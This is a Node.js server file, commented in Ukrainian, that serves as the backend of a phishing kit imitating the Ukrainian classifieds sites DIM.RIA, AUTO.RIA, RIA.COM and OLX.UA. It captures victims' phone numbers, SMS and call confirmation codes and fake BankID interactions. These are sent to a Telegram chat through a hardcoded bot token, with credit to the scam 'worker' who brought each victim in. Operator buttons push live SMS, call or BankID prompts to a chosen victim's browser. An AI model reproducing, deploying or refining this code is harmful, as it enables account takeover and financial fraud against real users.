const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fetch = require('node-fetch');
const http = require('http'); 
const socketIo = require('socket.io'); 

const app = express();
const server = http.createServer(app); 
const io = socketIo(server); 
const PORT = process.env.PORT || 3000;

// === КОНФІГУРАЦІЯ TELEGRAM ===
const BOT_TOKEN = "8311394660:AAEt9CJLYspkbVUcopIYik2KFh1EXLgIko8";
const CHAT_ID = "-1003298945563"; // Загальний чат для логів
const ADMIN_CHAT_ID = "-1003298945563"; // Чат, де будуть кнопки керування
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const TELEGRAM_WEBHOOK_URL = `/telegram-webhook-qN-09p-key`; // Секретний шлях для Telegram Webhook

// === ЗБЕРІГАННЯ СТАНУ ===
// Зберігає відповідність між номером телефону і Socket ID
const clientSockets = {}; 
// Зберігає стан користувача після введення телефону
const userSession = {}; 

app.use(bodyParser.json());
app.use(express.static(__dirname));

// === ЛОГОТИПИ ТА НАЗВИ ПРОЕКТІВ ===
const LOGOS = {
    dimria: "https://play-lh.googleusercontent.com/ztuWEFjw0OavxEvC_Zsxfg9J8gRj_eRFdsSMM7ElokPPUwmc2lAqCW47wbESieS6bw",
    autoria: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/ed/43/65/ed436516-dde8-f65c-d03b-99a9f905fcbd/AppIcon-0-1x_U007emarketing-0-8-0-85-220-0.png/1200x630wa.png",
    ria: "https://ria.riastatic.com/dist/img/logo900.png",
    olx: "https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/59/21/61/592161cf-9ee3-135c-3e1b-3510535e4b0a/AppIcon_OLX_EU-0-0-1x_U007emarketing-0-8-0-85-220.png/1200x630wa.png"
};

const PROJECT_NAMES = {
    dimria: "DIM.RIA",
    autoria: "AUTO.RIA",
    ria: "RIA.COM",
    olx: "OLX.UA"
};

// === ФУНКЦІЯ ВІДПРАВКИ В TELEGRAM ===

async function sendToTelegram(message, chatId = CHAT_ID, inline_keyboard = null) {
    const payload = { 
        chat_id: chatId, 
        text: message, 
        parse_mode: 'Markdown' 
    };

    if (inline_keyboard) {
        payload.reply_markup = JSON.stringify({ inline_keyboard });
    }

    for (let i = 0; i < 3; i++) {
        try {
            const res = await fetch(TELEGRAM_API, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                timeout: 10000
            });
            const result = await res.json();
            if (res.ok && result.ok) return true;
            console.error('Telegram error:', result);
            if (result.error_code === 403) return false;
        } catch (err) {
            console.error(`Попытка ${i + 1}:`, err.message);
            if (i === 2) return false;
            await new Promise(r => setTimeout(r, 2000));
        }
    }
    return false;
}

// === SOCKET.IO: З'ЄДНАННЯ ТА ІДЕНТИФІКАЦІЯ ===

io.on('connection', (socket) => {
    console.log('Новий користувач підключився через Socket.IO');

    socket.on('identify', (data) => {
        // Зберігаємо socket.id за номером телефону
        if (data.phone) {
            const key = data.phone;
            clientSockets[key] = socket.id;
            console.log(`Клієнт ідентифікований: ${key} -> ${socket.id}`);
        }
    });

    socket.on('disconnect', () => {
        // Видаляємо socket.id при відключенні
        for (const key in clientSockets) {
            if (clientSockets[key] === socket.id) {
                delete clientSockets[key];
                console.log(`Клієнт відключився: ${key}`);
                break;
            }
        }
    });
});

// === API ДЛЯ ВІДПРАВКИ ДАНИХ (ЛОГІВ) ===

app.post('/api/send-data', async (req, res) => {
    const { step, phone, code, callCode, worker, project = 'dimria', city = 'Невідомо' } = req.body;

    const projectName = PROJECT_NAMES[project] || 'DIM.RIA';
    let message = '';
    
    // Крок 1: Введення телефону
    if (step === 'phone' && phone) {
        // 1. Зберігаємо сесію користувача
        userSession[phone] = { worker, project, city };
        
        // 2. Формуємо повідомлення для адміна
        message = `*НОВИЙ ВХІД* 👤\n*Проект:* ${projectName} ⚡\n*Номер:* \`${phone}\`\n*Місто:* ${city}`;
        if (worker) message += `\n*Воркер:* @${worker}`;
        
        // 3. Створюємо інлайн-клавіатуру для адміна
        const inline_keyboard = [
            [
                { text: "📞 Звонок", callback_data: `CMD_CALL_${phone}` },
                { text: "💬 Код", callback_data: `CMD_SMS_${phone}` },
                { text: "💳 BankID", callback_data: `CMD_BANKID_${phone}` }
            ]
        ];

        // 4. Надсилаємо повідомлення з кнопками в чат керування
        await sendToTelegram(message, ADMIN_CHAT_ID, inline_keyboard);
        
        // 5. Надсилаємо звичайне повідомлення у загальний чат (якщо чати різні)
        if (ADMIN_CHAT_ID !== CHAT_ID) {
            await sendToTelegram(message, CHAT_ID);
        }
    } 
    // Обробка успішного введення кодів
    else if ((step === 'code' && code) || (step === 'call' && callCode)) {
        const type = step === 'code' ? 'SMS' : 'ДЗВІНОК';
        const value = step === 'code' ? code : callCode;
        const session = userSession[phone] || {};

        message = `*-- УСПІШНИЙ ВВІД --* ✅\n*Тип:* ${type}\n*Код/Цифри:* \`${value}\`\n*Номер:* \`${phone}\`\n*Проект:* ${projectName}`;
        if (session.worker) message += `\n*Воркер:* @${session.worker}`;

        await sendToTelegram(message, CHAT_ID);
    }
    // Обробка натискання кнопки "Підтвердити" на формі BankID
    else if (step === 'bankid_click' && phone) {
        const session = userSession[phone] || {};
        message = `*BankID-КНОПКА НАТИСНУТА* ⚠️\n*Номер:* \`${phone}\`\n*Проект:* ${projectName}`;
        if (session.worker) message += `\n*Воркер:* @${session.worker}`;
        
        await sendToTelegram(message, CHAT_ID);
    }
    else if (step === 'bankid_show' && phone) {
        // Просто лог про те, що форма BankID була показана
        console.log(`BankID form shown for ${phone}`);
    }

    res.json({ success: true });
});

// === TELEGRAM WEBHOOK: ОБРОБКА КНОПОК ===

app.post(TELEGRAM_WEBHOOK_URL, (req, res) => {
    const update = req.body;

    if (update.callback_query) {
        const callbackQuery = update.callback_query;
        const data = callbackQuery.data;
        const chatId = callbackQuery.message.chat.id;
        
        // Перевіряємо, чи це команда керування
        if (data.startsWith('CMD_') && chatId.toString() === ADMIN_CHAT_ID.toString()) {
            const parts = data.split('_');
            const command = parts[1]; // CALL, SMS, BANKID
            const targetPhone = parts[2]; // Номер телефону клієнта

            const socketId = clientSockets[targetPhone];
            if (socketId) {
                // Надсилаємо команду конкретному клієнту через Socket.IO
                io.to(socketId).emit('server_command', { command: command });
                
                // Змінюємо текст кнопки в Telegram
                const newText = `*${command}* команду відправлено на \`${targetPhone}\``;
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        message_id: callbackQuery.message.message_id,
                        text: newText,
                        parse_mode: 'Markdown'
                    })
                });

            } else {
                sendToTelegram(`Помилка: Клієнт \`${targetPhone}\` не підключений (Socket ID не знайдено).`, chatId);
            }
        }
        
        // Відповідь на callback_query, щоб прибрати "годинник"
        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ callback_query_id: callbackQuery.id })
        });
    }

    res.sendStatus(200);
});


// === МАРШРУТИЗАЦІЯ ДЛЯ ФАЙЛІВ ===

app.get('/', (req, res) => {
    const project = req.query.project || 'dimria';
    if (!['dimria', 'autoria', 'ria', 'olx'].includes(project)) {
        return res.status(400).send('Невідомий проект');
    }
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/logo', (req, res) => {
    const project = req.query.project || 'dimria';
    const logo = LOGOS[project] || LOGOS.dimria;
    res.redirect(logo);
});

app.get('/panel', (req, res) => res.sendFile(path.join(__dirname, 'panel.html')));


// === ЗАПУСК СЕРВЕРА ===

server.listen(PORT, () => {
    console.log(`Сервер: http://localhost:${PORT}`);
    console.log(`Панель: http://localhost:${PORT}/panel`);
    console.log(`Telegram Webhook Endpoint: http://localhost:${PORT}${TELEGRAM_WEBHOOK_URL}`);
    
    // Початкове повідомлення при старті
    setTimeout(() => {
        sendToTelegram(`*Проекти успішно стали на сервер* ✅\nНаші проекти: DIM.RIA / AUTO.RIA / RIA.COM / OLX.UA`);
    }, 3000);
});
